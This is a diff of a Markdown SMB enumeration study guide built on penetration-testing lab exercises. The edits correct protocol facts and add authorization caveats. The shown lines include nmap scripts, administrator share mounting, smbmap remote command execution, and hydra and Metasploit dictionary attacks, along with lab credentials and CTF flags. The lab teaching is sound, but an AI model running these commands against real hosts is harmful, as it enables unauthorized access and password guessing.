@@ -14,7 +14,7 @@ Here are some key features and uses of the SMB protocol:
 6. **Version History:** SMB has gone through several versions, including SMB1, SMB2, and SMB3. Each version introduced improvements in terms of security, performance, and functionality.
 7. **Encryption and Security:** Recent versions of SMB (SMB3) incorporate advanced security features such as encryption, signing, and improved authentication mechanisms to enhance the protection of data in transit.
 8. **Cross-Platform Support:** While SMB is closely associated with Windows, it is supported on various platforms through different implementations. For example, Samba is an open-source implementation of the SMB/CIFS protocol that allows Unix-like systems to share resources with Windows systems.
-9. **CIFS:** Common Internet File System (CIFS) is a more advanced version of SMB that provides additional features and better compatibility with modern network environments.
+9. **CIFS:** CIFS is a term commonly associated with the older SMB 1.0 dialect; it is not a newer or more advanced replacement for modern SMB2/SMB3.
 
 ## SMB Enumeration
 
@@ -32,10 +32,10 @@ During SMB enumeration, a penetration tester or security analyst attempts to ret
 
 ### SMB Ports
 
-* TCP Port 445 - **Microsoft-DS** (Microsoft Directory Services): This is the main port used for SMB traffic on modern networks. It is commonly used for file and printer sharing, as well as other SMB-related operations.
+* TCP port 445 - SMB directly over TCP; this is the main port used by modern Windows and Samba deployments. It is commonly used for file and printer sharing, as well as other SMB-related operations.
 * UDP Port 137 - **NetBIOS Name Service**: This port is used for the NetBIOS Name Resolution service. NetBIOS (Network Basic Input/Output System) is a service that allows computers to communicate within a local network. This port is involved in resolving NetBIOS names to IP addresses.
 * UDP Port 138 - **NetBIOS Datagram Service**: This port is used for the NetBIOS Datagram Service. It is involved in the communication of datagrams between devices on the network.
-* TCP Port 139 - **NetBIOS Session Service**: In the past, this port was widely used for SMB traffic, but it has become less common in modern networks. It was used for file access operations and resource sharing.
+* TCP port 139 - NetBIOS Session Service, used by legacy SMB over NetBIOS.
 
 ### SMB: Windows Discover & Mount
 
@@ -67,7 +67,7 @@ The target subnet is “255.255.240.0” hence we have mentioned CIDR to 20.
 
 We see that hosts with IP: 10.2.22.92 and 10.2.25.111 have SMB open ports (139, 445).
 
-We have the credentials to access the target server, we can use GUI mode or terminal.
+The lab provides credentials for authorized access. Use the GUI or command line; avoid reusing lab credentials outside this exercise.
 
 ```bash
 net use Z: \\10.2.22.92\C$ smbserver_771 /user:administrator
@@ -75,15 +75,11 @@ net use Z: \\10.2.22.92\C$ smbserver_771 /user:administrator
 
 to delete sharing files we use this command:
 
-```bash
- net use * /delete
+```cmd
+net use Z: /delete
 ```
 
-<div align="left">
-
-
-
-</div>
+Remove only the mapped drive created for this exercise. `net use * /delete` disconnects every mapped network connection for the current user.
 
 ### SMB: Nmap Scripts
 
@@ -101,7 +97,7 @@ sudo nmap -p139,445 -sV -sC -O <TARGET_IP>
 
 #### Lab 1
 
-> 🔬 [Windows Recon: SMB Nmap Scripts](https://attackdefense.com/challengedetailsnoauth?cid=2222)
+>  [Windows Recon: SMB Nmap Scripts](https://attackdefense.com/challengedetailsnoauth?cid=2222)
 >
 > * Target IP: `10.2.27.65`
 > * Enumeration of SMB protocol dialects, security level information, active sessions, Windows users and shares, domains, services.
@@ -138,12 +134,6 @@ Host script results:
 |     3.00
 |_    3.02
 ```
-
-<div align="left">
-
-
-
-</div>
 
 * Find [SMB security level](https://nmap.org/nsedoc/scripts/smb-security-mode.html) with another nmap script
 
@@ -242,7 +232,7 @@ Host script results:
 |_    Current user access: READ
 ```
 
-> 📌 **`IPC$`** ([`null session connection`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)) - with this session, Windows lets guest _anonymous users enumerate the names of domain accounts and network shares_.
+>  **`IPC$`** ([`null session connection`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)) - with this session, Windows lets guest _anonymous users enumerate the names of domain accounts and network shares_.
 
 * Enumerate SMB shares with an _authenticated_ user (administrator account)
 
@@ -320,7 +310,7 @@ Host script results:
 |_    Current user access: READ/WRITE
 ```
 
-> 📌 The authenticated user, the **administrator** in this case, has **Read & Write** privileges to the entire `C$` (and `D$`) drive.
+>  The authenticated user, the **administrator** in this case, has **Read & Write** privileges to the entire `C$` (and `D$`) drive.
 
 * Enumerate [Windows users](https://nmap.org/nsedoc/scripts/smb-enum-users.html)
 
@@ -341,7 +331,7 @@ Host script results:
 |_    Flags:       Password does not expire, Password not required, Normal user account
 ```
 
-> 📌 Three users are present with some dangerous _flags_ and misconfigurations.
+>  Three users are present with some dangerous _flags_ and misconfigurations.
 >
 > * `Guest` user - _no password expiration, password not required, normal user account_
 > * `Administrator`, `bob` - _no password expiration_
@@ -363,7 +353,7 @@ Host script results:
 * Enumerate [system domains](https://nmap.org/nsedoc/scripts/smb-enum-domains.html) and policies
 
 ```bash
-nmap -p445 --script smb-enum-domains--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.27.65
+nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.27.65
 ```
 
 ```bash
@@ -387,7 +377,7 @@ Host script results:
 * Enumerate [available groups](https://nmap.org/nsedoc/scripts/smb-enum-groups.html)
 
 ```bash
-nmap -p445 --script smb-enum-groups--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.27.65
+nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.27.65
 ```
 
 ```bash
@@ -584,7 +574,7 @@ Host script results:
 
 #### Lab 2
 
-> 🔬 [Windows Recon: SMBMap](https://attackdefense.com/challengedetails?cid=2221)
+>  [Windows Recon: SMBMap](https://attackdefense.com/challengedetails?cid=2221)
 >
 > * Target IP: `10.2.21.128`
 > * Use of [`smbmap`](https://www.kali.org/tools/smbmap/) to enumerate samba shares and permissions. Upload, download, delete files
@@ -656,7 +646,7 @@ smbmap -u administrator -p smbserver_771 -d . -H 10.2.21.128
 smbmap -u administrator -p smbserver_771 -H 10.2.21.128 -x 'ipconfig'
 ```
 
-> ❗ _**R**emote **C**ode **E**xecution_ (**`RCE`**) can be achieved through SMB!
+>  _**R**emote **C**ode **E**xecution_ (**`RCE`**) can be achieved through SMB!
 
 * List all drives with `-L` option
 
@@ -727,7 +717,7 @@ cat 10.2.21.128-C_flag.txt
 
 <details>
 
-<summary>Reveal Flag: 🚩</summary>
+<summary>Reveal Flag: </summary>
 
 `25f492dbef8453cdca69a173a75790f0`
 
@@ -737,7 +727,7 @@ cat 10.2.21.128-C_flag.txt
 
 #### Lab 3
 
-> 🔬 [Samba Recon: Basics 1](https://attackdefense.com/challengedetails?cid=553)
+>  [Samba Recon: Basics 1](https://attackdefense.com/challengedetails?cid=553)
 >
 > * Target IP: `192.28.157.45`
 > * Linux SMB (**`smbd`**) enumeration
@@ -769,7 +759,7 @@ Service Info: Host: SAMBA-RECON
 # Enumeration of the 139, 445 ports services
 ```
 
-> 📌 Default `smbd` TCP used ports are `139`, `445`. Workgroup name of samba server is `RECONLABS`.
+>  Default `smbd` TCP used ports are `139`, `445`. Workgroup name of samba server is `RECONLABS`.
 
 ```bash
 nmap -sU --top-ports 25 --open 192.28.157.45
@@ -780,7 +770,7 @@ nmap -sU --top-ports 25 --open 192.28.157.45
 138/udp open|filtered netbios-dgm
 ```
 
-> 📌 Default `nmbd` UDP used ports are `137`, `138`
+>  Default `nmbd` UDP used ports are `137`, `138`
 
 ```bash
 nmap --script smb-os-discovery -p 445 192.28.157.45
@@ -797,7 +787,7 @@ Host script results:
 |_  System time: 2023-08-14T15:33:34+00:00
 ```
 
-> 📌 Version of samba server is `Samba 4.3.11-Ubuntu`. NetBIOS computer name is `SAMBA-RECON`.
+>  Version of samba server is `Samba 4.3.11-Ubuntu`. NetBIOS computer name is `SAMBA-RECON`.
 
 #### [metasploit](https://www.metasploit.com/)
 
@@ -881,7 +871,7 @@ rpcclient -U "" -N 192.28.157.45
 
 <details>
 
-<summary>Reveal Flag - The NetBIOS computer name is: 🚩</summary>
+<summary>Reveal Flag - The NetBIOS computer name is: </summary>
 
 `SAMBA-RECON`
 
@@ -889,7 +879,7 @@ rpcclient -U "" -N 192.28.157.45
 
 #### Lab 4
 
-> 🔬 [Samba Recon: Basics 2](https://attackdefense.com/challengedetails?cid=554)
+>  [Samba Recon: Basics 2](https://attackdefense.com/challengedetails?cid=554)
 >
 > * Target IP: `192.230.128.82`
 > * Linux SMB enumeration
@@ -919,7 +909,7 @@ rpcclient $> srvinfo
         server type     :       0x809a03
 ```
 
-> 📌 OS Version of samba server is `6.1`.
+>  OS Version of samba server is `6.1`.
 
 #### [enum4linux](https://labs.portcullis.co.uk/tools/enum4linux/)
 
@@ -992,7 +982,7 @@ Reconnecting with SMB1 for workgroup listing.
   RECONLABS            SAMBA-RECON
 ```
 
-> 📌 Samba server description is `samba.recon.lab`
+>  Samba server description is `samba.recon.lab`
 
 ```bash
 nmap -p445 --script smb-protocols 192.230.128.82
@@ -1010,7 +1000,7 @@ Host script results:
 |_    3.11
 ```
 
-> 📌 NTLM 0.12 (SMBv1) dialects supported
+>  NTLM 0.12 (SMBv1) dialects supported
 
 ```bash
 msfconsole
@@ -1029,7 +1019,7 @@ exploit
 [*] Auxiliary module execution completed
 ```
 
-> 📌 [SMB2](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb2/) is supported and has been online for 3700245 hours
+>  [SMB2](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb2/) is supported and has been online for 3700245 hours
 
 * List all Samba server users with various techniques/tools
 
@@ -1050,7 +1040,7 @@ exploit
 [*] Auxiliary module execution completed
 ```
 
-> 📌 Users are: `john`, `elie`, `aisha`, `shawn`, `emma`, `admin`
+>  Users are: `john`, `elie`, `aisha`, `shawn`, `emma`, `admin`
 
 ```bash
 nmap -p445 --script smb-enum-users 192.230.128.82
@@ -1155,7 +1145,7 @@ admin S-1-5-21-4056189605-2085045094-1961111545-1005 (User: 1)
 
 <details>
 
-<summary>Reveal Flag - SID of user “admin” is: 🚩</summary>
+<summary>Reveal Flag - SID of user “admin” is: </summary>
 
 `S-1-5-21-4056189605-2085045094-1961111545-1005`
 
@@ -1163,7 +1153,7 @@ admin S-1-5-21-4056189605-2085045094-1961111545-1005 (User: 1)
 
 #### Lab 5
 
-> 🔬 [Samba Recon: Basics 3](https://attackdefense.com/challengedetails?cid=555)
+>  [Samba Recon: Basics 3](https://attackdefense.com/challengedetails?cid=555)
 >
 > * Target IP: `192.187.39.6`
 > * Linux SMB detailed enumeration
@@ -1241,7 +1231,7 @@ Host script results:
 |_    Current user access: READ/WRITE
 ```
 
-> 📌 Available shares on the samba server are `IPC$`, `aisha`, `emma`, `everyone`, `john`, `public`.
+>  Available shares on the samba server are `IPC$`, `aisha`, `emma`, `everyone`, `john`, `public`.
 
 ```bash
 msfconsole
@@ -1361,7 +1351,7 @@ group:[Maintainer] rid:[0x3ee]
 group:[Reserved] rid:[0x3ef]
 ```
 
-> 📌 Available domain groups are `Maintainer`, `Reserved`
+>  Available domain groups are `Maintainer`, `Reserved`
 
 * Check if samba server is configured for printing
 
@@ -1376,7 +1366,7 @@ enum4linux -i 192.187.39.6
 No printers returned.
 ```
 
-> 📌 No printers returned.
+>  No printers returned.
 
 ```bash
 smbclient //192.187.39.6/public -N
@@ -1391,7 +1381,7 @@ smb: \> ls
 # ls command
 ```
 
-> 📌 There are 2 directories present inside `public` share: `secret` and `dev`
+>  There are 2 directories present inside `public` share: `secret` and `dev`
 
 ```bash
 smb: \> cd secret
@@ -1410,7 +1400,7 @@ root@attackdefense:~# cat flag
 
 <details>
 
-<summary>Reveal Flag: 🚩</summary>
+<summary>Reveal Flag: </summary>
 
 `03ddb97933e716f5057a18632badb3b4`
 
@@ -1418,16 +1408,16 @@ root@attackdefense:~# cat flag
 
 ***
 
-### SMB: Dictionary Attack
+### SMB: Password Auditing in a Lab
 
 #### Lab 6
 
-> 🔬 [Samba Recon: Dictionary Attack](https://attackdefense.com/challengedetails?cid=556)
+>  [Samba Recon: Dictionary Attack](https://attackdefense.com/challengedetails?cid=556)
 >
 > * Target IP: `192.174.58.6`
 > * Linux SMB detailed enumeration using `word lists`
 
-`Word lists` are lists of already known and used passwords, some of them leaked from breached websites or other services. Those passwords can be used as part of the attack via brute force tools.
+`Wordlists` contain candidate passwords, including common choices and passwords exposed in previous breaches. Password-guessing tests can trigger account lockouts and generate significant traffic; run them only in an explicitly authorized lab or engagement with agreed limits.
 
 In Kali Linux [wordlists](https://www.kali.org/tools/wordlists/) can be found inside `/usr/share/wordlists` directory.
 
@@ -1479,7 +1469,7 @@ exploit
 [*] 192.174.58.6:445      - Scanned 1 of 1 hosts (100% complete)
 ```
 
-> 📌 Jane's password is `abc123`
+>  Jane's password is `abc123`
 
 #### [hydra](https://www.kali.org/tools/hydra/)
 
@@ -1500,7 +1490,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.174.58.6 smb
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-> 📌 _admin_'s password is `password1`
+>  _admin_'s password is `password1`
 
 * Find `smb shares` using found credentials
 
@@ -1520,7 +1510,7 @@ smbmap -u admin -p password1 -H 192.174.58.6
    IPC$     NO ACCESS
 ```
 
-> 📌 _Read-only_ share is `nancy`
+>  _Read-only_ share is `nancy`
 
 ```bash
 smbclient -L 192.28.157.6 -U jane
@@ -1543,7 +1533,7 @@ smb: \> pwd
 Current directory is \\192.174.58.6\jane\
 ```
 
-> 📌 _jane_'s share is not browsable but it exists.
+>  _jane_'s share is not browsable but it exists.
 
 ```bash
 smbclient //192.174.58.6/admin -U admin
@@ -1578,7 +1568,7 @@ root@attackdefense:~# cat flag
 
 <details>
 
-<summary>Reveal Flag: 🚩</summary>
+<summary>Reveal Flag: </summary>
 
 `2727069bc058053bd561ce372721c92e`
 
@@ -1604,7 +1594,7 @@ exploit
 [*] 192.174.58.6: - Scanned 1 of 1 hosts (100% complete)
 ```
 
-> 📌 Named pipes available over SMB are `netlogon`, `lsarpc`, `samr`, `eventlog`, `InitShutdown`, `ntsvcs`, `srvsvc`, `wkssvc`
+>  Named pipes available over SMB are `netlogon`, `lsarpc`, `samr`, `eventlog`, `InitShutdown`, `ntsvcs`, `srvsvc`, `wkssvc`
 
 * List users' SID by performing RID cycling.
 
@@ -1620,10 +1610,10 @@ S-1-22-1-1002 Unix User\nancy (Local User)
 S-1-22-1-1003 Unix User\admin (Local User)
 ```
 
-> 📌 shawn SID is `S-1-22-1-1000`
+>  shawn SID is `S-1-22-1-1000`
 >
-> 📌 jane SID is `S-1-22-1-1001`
+>  jane SID is `S-1-22-1-1001`
 >
-> 📌 nancy SID is `S-1-22-1-1002`
+>  nancy SID is `S-1-22-1-1002`
 >
-> 📌 admin SID is `S-1-22-1-1003`
+>  admin SID is `S-1-22-1-1003`
